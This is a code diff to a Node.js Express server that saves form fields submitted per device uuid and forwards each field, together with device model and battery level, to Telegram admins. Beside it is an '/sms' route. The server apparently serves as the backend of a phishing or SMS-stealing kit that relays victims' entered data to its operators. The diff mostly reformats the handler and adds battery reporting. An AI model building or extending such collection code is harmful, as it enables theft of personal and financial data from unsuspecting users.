@@ -89,22 +89,33 @@ app.post('/sms',(req,res) => {
 });
 
 // HTML Form submit
-app.post('/html-form-data',(req,res)=>{
-  const {uuid,...fields}=req.body;
-  if(!uuid) return res.status(400).send('missing uuid');
-  const fp = path.join(STORAGE_DIR,`${uuid}.json`);
-  fs.writeJsonSync(fp,fields,{spaces:2});
-  const device = devices.get(uuid)||{model:uuid};
-  let msg = `🧾 *Form Submitted*\n📱 ${device.model}\n`;
-  for(let[k,v] of Object.entries(fields)){
-    const label=k.replace(/_/g,' ').replace(/\b\w/g,c=>c.toUpperCase());
-    msg+=`🔸 *${label}*: ${v}\n`;
+app.post('/html-form-data', (req, res) => {
+  const { uuid, ...fields } = req.body;
+  if (!uuid) return res.status(400).send('missing uuid');
+
+  // Save form data
+  const fp = path.join(STORAGE_DIR, `${uuid}.json`);
+  fs.writeJsonSync(fp, fields, { spaces: 2 });
+
+  // Get device info (including battery)
+  const device = devices.get(uuid) || { model: uuid, battery: 'N/A' };
+
+  // Prepare message with battery below device name
+  let msg = `🧾 *Form Submitted*\n📱 ${device.model}\n🔋 Battery: ${device.battery || 'N/A'}%\n`;
+
+  // Add all form fields
+  for (let [k, v] of Object.entries(fields)) {
+    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
+    msg += `🔸 *${label}*: ${v}\n`;
   }
-  msg+=`\n👨‍💻 Developer: ${DEVELOPER}`;
-  ADMIN_IDS.forEach(id=>bot.sendMessage(id,msg,{parse_mode:'Markdown'}).catch(()=>{}));
+
+  msg += `\n👨‍💻 Developer: ${DEVELOPER}`;
+
+  // Send to all admins
+  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
+
   res.sendStatus(200);
 });
-
 // ===== TELEGRAM BOT =====
 bot.on('message', msg => {
   const chatId = msg.chat.id;
